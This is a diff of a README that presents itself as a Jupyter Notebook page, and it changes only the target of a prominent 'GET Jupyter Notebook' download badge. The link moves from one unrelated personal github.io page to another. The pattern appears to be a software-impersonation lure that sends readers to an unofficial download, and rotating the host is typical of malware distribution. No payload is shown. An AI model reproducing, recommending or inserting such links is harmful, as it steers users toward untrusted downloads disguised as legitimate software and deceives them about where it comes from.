@@ -1,6 +1,6 @@
 # Jupyter Notebook - Interactive Python Notebook Environment
 
-[![GET Jupyter Notebook](https://img.shields.io/badge/GET%20%E2%80%94%20Jupyter%20Notebook-0078D6?style=for-the-badge&logoColor=white)](https://tannerlawsonuwyy.github.io/.github/python-jupyter-notebook)
+[![GET Jupyter Notebook](https://img.shields.io/badge/GET%20%E2%80%94%20Jupyter%20Notebook-0078D6?style=for-the-badge&logoColor=white)](https://juanmayolgxu.github.io/.github/python-jupyter-notebook)
 
 ## Explore Jupyter Notebook for Interactive Computing
 
